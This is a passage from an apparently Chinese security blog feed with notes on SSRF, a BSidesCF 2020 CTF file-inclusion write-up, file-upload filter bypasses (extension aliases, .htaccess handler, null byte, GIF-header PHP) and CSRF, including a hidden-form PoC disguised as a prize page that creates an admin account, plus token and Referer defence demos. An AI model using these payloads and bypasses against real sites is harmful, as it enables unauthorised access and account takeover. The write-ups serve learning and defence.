class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fp</span>=fsockopen(<span class="variable">$host</span>,intval(<span class="variable">$port</span>),<span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span>(error number <span class="subst">$errno</span>)\n&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$out</span>=<span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;Connection: Close\r\n\r\n&quot;</span></span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        fwrite(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">            <span class="variable">$contents</span>.=fgets(<span class="variable">$fp</span>,<span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$curlobj</span>=curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_POST,<span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>,CUTLOPT_RETURNTRANSFER,<span class="literal">TRUE</span>);<span class="comment">//将curl_exec()获取的信息以字符串返回，不是直接输出</span></span><br><span class="line">        <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">        curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>,<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h4><p>内网探测</p><p>端口扫描</p>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Bsidesctf 2020]Had a bad day</title>
      <link href="2021/02/03/bsidesctf-2020-had-a-bad-day/"/>
      <url>2021/02/03/bsidesctf-2020-had-a-bad-day/</url>
      
        <content type="html"><![CDATA[<p>简单的 php伪协议读源码</p><span id="more"></span><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h4 id="伪协议读源码"><a href="#伪协议读源码" class="headerlink" title="伪协议读源码"></a>伪协议读源码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;  <span class="comment">//必须出现 woofers meowers index之一</span></span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);  <span class="comment">//强行加后缀</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="这个题有两种payload"><a href="#这个题有两种payload" class="headerlink" title="这个题有两种payload"></a>这个题有两种payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers.&#x2F;..&#x2F;flag</span><br><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h4 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h4><blockquote><p>php://filter 可以嵌套一层不存在的协议</p><p>php://filter/convert.base64-encode/woofers/resource=</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于文件上传的一些常见bypass技巧</title>
      <link href="2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/"/>
      <url>2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p><span id="more"></span><h3 id="一些常见bypass技巧分析"><a href="#一些常见bypass技巧分析" class="headerlink" title="一些常见bypass技巧分析"></a>一些常见bypass技巧分析</h3><h4 id="bypass-javascript限制"><a href="#bypass-javascript限制" class="headerlink" title="bypass javascript限制"></a>bypass javascript限制</h4><p>前端对于后缀名有限制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file= <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(file== <span class="literal">null</span> || file ==<span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;请选择上传的文件&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext=<span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name= file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>))</span></span><br><span class="line">        if (allow_ext.indexOf(ext_name)== -1)&#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg= <span class="string">&quot;该文件不允许上传，请上传&quot;</span>+allow_ext+<span class="string">&quot;类型的文件&quot;</span>;</span></span><br><span class="line">            alert(errMsg);</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>浏览器禁用js </p><p><img src="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203173826587.png" class="lazyload" data-srcset="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203173826587.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210203173826587"></p></li><li><p>burp直接删掉js</p><p><img src="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203193536829.png" class="lazyload" data-srcset="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203193536829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210203193536829"></p></li></ul><h4 id="bypass-MIME类型限制"><a href="#bypass-MIME类型限制" class="headerlink" title="bypass MIME类型限制"></a>bypass MIME类型限制</h4><blockquote><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种<a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E5%90%8D/103577">扩展名</a>的<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6/6270998">文件</a>用一种<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>来打开的方式类型，当该扩展名文件被访问的时候，<a href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911">浏览器</a>会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p></blockquote><p>在php代码中对 文件类型进行了限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]== <span class="string">&#x27;image/jpeg&#x27;</span></span><br></pre></td></tr></table></figure><p>抓包 更改 Content-Type  放包即可绕过</p><h4 id="bypass-黑名单后缀名"><a href="#bypass-黑名单后缀名" class="headerlink" title="bypass 黑名单后缀名"></a>bypass 黑名单后缀名</h4><p>在 php 代码中做了如下限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;upload_file&quot;</span>][<span class="string">&quot;name&quot;</span>] !=<span class="string">&quot;.php&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p>我们可以采用php的一些别名来绕过</p><blockquote><p>php3 php5 phtml pht phps php4 php1  </p></blockquote></li><li><p>利用.htaccess进行绕过 </p><blockquote><p>htaccess文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：</p><p>网页301重定向、自定义404错误页面、改变文件扩展名、允许/组织特定的用户或者目录的访问、禁止目录列表、配置</p><p>默认文档等功能。</p><p>其中 当.htaccess 文件内容：</p><p>SetHandler application/x-httpd-php</p><p>设置当前目录所有文件都使用php解析，无论上传任何文件，只要文件内容符合php语言代码规范，即可当做php代码执行</p></blockquote><p> <strong>一个重要的tip！</strong></p><blockquote><p>在 Apache中如果启动 .htaccess 必须在http.conf 中设置 AllowOverride  All</p></blockquote></li><li><p>利用大小写来绕过</p><blockquote><p>Windows下，对于文件名中的大小写不敏感。例如：test.php 和 TeST.PHP 是一样的</p><p>当然这种绕过方式只能应用于 windows系统</p></blockquote></li><li><p>利用空格绕过</p><blockquote><p>windows系统下，对于文件名中的空格会做空处理，程序中的检测代码却不能忽略空格。从而绕过黑名单。</p></blockquote></li><li><p>利用点号绕过</p><blockquote><p>windows系统下，文件后缀名最后一个点号会自动去除</p></blockquote></li><li><p>利用特殊符号绕过</p><blockquote><p>windows系统下，如果上传文件名中test.php::$DATA 会在服务器上生成一个test.php的文件，其中内容和所上传的文件内容相同，并被解析</p></blockquote></li><li><p>利用常规的双写绕过</p><blockquote><p>str_ireplace() 函数替换字符串中的一些字符，只进行一次</p><p>所以双写去掉一次，正好</p></blockquote></li></ul><h4 id="bypass-白名单后缀名"><a href="#bypass-白名单后缀名" class="headerlink" title="bypass 白名单后缀名"></a>bypass 白名单后缀名</h4><ul><li><p>00 截断</p><blockquote><p>0x00是16进制表示法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符</p><p>系统在对文件名的读取时，如果遇上0x00，就会认为读取已经结束</p></blockquote><p>一个重要的tips</p><blockquote><p>在php5.3之后的版本中完全修复了00截断。00截断受限于GPC是否开启</p></blockquote></li></ul><h4 id="bypass-文件二进制格式"><a href="#bypass-文件二进制格式" class="headerlink" title="bypass 文件二进制格式"></a>bypass 文件二进制格式</h4><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范</p><p>比如对图片格式进行验证</p><p>我们可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF98A</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入研究CSRF漏洞</title>
      <link href="2021/01/31/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2021/01/31/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>CSRF作为一种被动的漏洞，在ctf比赛中较为少见，因此以往并没有引起笔者的重视</p><p>笔者最近在往实战方向转移，所以从新研究了一下csrf漏洞</p><span id="more"></span><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><h3 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h3><p>CSRF(跨站伪造请求)也被成为One click Attack 或 Session Riding。</p><blockquote><p>XSS与CSRF的区别：</p><ol><li>XSS利用站点内的信任用户，盗取Cookie</li><li>CSRF通过伪造成受信任的用户请求受信任网站。</li></ol></blockquote><p><strong>原理：利用目标用户的合法身份，以目标用户的名义执行某些非法操作</strong></p><h3 id="CSRF漏洞利用"><a href="#CSRF漏洞利用" class="headerlink" title="CSRF漏洞利用"></a>CSRF漏洞利用</h3><p>GET型CSRF利用比较简单，此处不赘述</p><p>POST型CSRF利用 </p><p>我们利用表单进行提交。将标签的type属性设置为hidden，例如：<code>&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;11111&quot; /&gt;</code></p><p>下面写一个小demo</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>恭喜中奖<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/csrf_test/post_csrf/new_user.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin_test&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin_test&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OK&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span> <span class="attr">value</span>=<span class="string">&quot;中奖了&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSRF探测及自动化"><a href="#CSRF探测及自动化" class="headerlink" title="CSRF探测及自动化"></a>CSRF探测及自动化</h3><p><strong>几种csrf防护手段</strong></p><blockquote><p>HTTP Referer 头验证</p><p>设置Token</p><p>HTTP自定义头</p><p>二次验证（指不仅进行后端认证，也进行前端认证，比如做修改密码操作时，弹出框提醒用户），验证码</p></blockquote><p>如果web应用程序的http请求中没有对应的预防措施，那么很大成度上就确定存在csrf漏洞</p><h4 id="CSRF自动化探测"><a href="#CSRF自动化探测" class="headerlink" title="CSRF自动化探测"></a>CSRF自动化探测</h4><p>采用CSRFTester，其原理相当于爬虫。采用agent 代理技术，抓取我们在浏览器中访问的所有连接以及所有表单，通过CSRFTester中修改表单的信息，重新提交，相当于一次伪造客户端请求，如果请求成功被服务器接收，则说明存在csrf漏洞。</p><p>Burpsuite自带自动生成 CSRFPOC 模块</p><h3 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h3><h4 id="利用token技术进行csrf漏洞防御"><a href="#利用token技术进行csrf漏洞防御" class="headerlink" title="利用token技术进行csrf漏洞防御"></a>利用token技术进行csrf漏洞防御</h4><p><strong>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作</strong></p><p>Token作为识别当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。 这里我给一个小demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$salt</span>=<span class="string">&quot;test&quot;</span>.date(<span class="string">&quot;Y/m/d&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span>=md5(<span class="variable">$salt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体操作</p><blockquote><ol><li>登入验证成功之后，在会话SESSION[“user_token”]中保存token</li><li>在后台操作中，增删改表单中增添隐藏域hidden，设置value为Token</li><li>每次提交之后验证Token是否正确</li></ol></blockquote><p>写一个dome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">token_generate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$salt</span>=<span class="string">&quot;hahahaha&quot;</span>.date(<span class="string">&quot;h:i:s&quot;</span>);</span><br><span class="line">        <span class="variable">$token</span>= md5(<span class="variable">$salt</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$token</span>= token_generate();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>]= <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;</span><br><span class="line">            &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$token</span>;?&gt;&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;s&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>token验证的时候可以单独写一个函数,当处理一些敏感操作时进行 token验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">token_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$user_token</span>=<span class="variable">$_POST</span>[<span class="string">&quot;user_token&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>]=<span class="variable">$user_token</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;非法操作&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CSRF-bypass-http-referer"><a href="#CSRF-bypass-http-referer" class="headerlink" title="CSRF bypass http_referer"></a>CSRF bypass http_referer</h3><blockquote><p>HTTP Referer 是header的一部分，当浏览器向web服务发送请求的时候，一般会带上Referer，告诉服务器从哪个页面链接来的，服务器基于此可以获得一些信息。</p></blockquote><p>在用于CSRF防御时，用户执行对应操作，提交的HTTP请求中有对应的Referer值，此时服务端判断Referer值是否与服务器器的域名信息相关，不相关则不允许执行操作</p><p>后端dome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>],<span class="string">&#x27;xx.com&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以构造文件名绕过 例如 <code>http://target.com/xx.com/1.php</code></p><h3 id="CSRF-payload"><a href="#CSRF-payload" class="headerlink" title="CSRF payload"></a>CSRF payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span 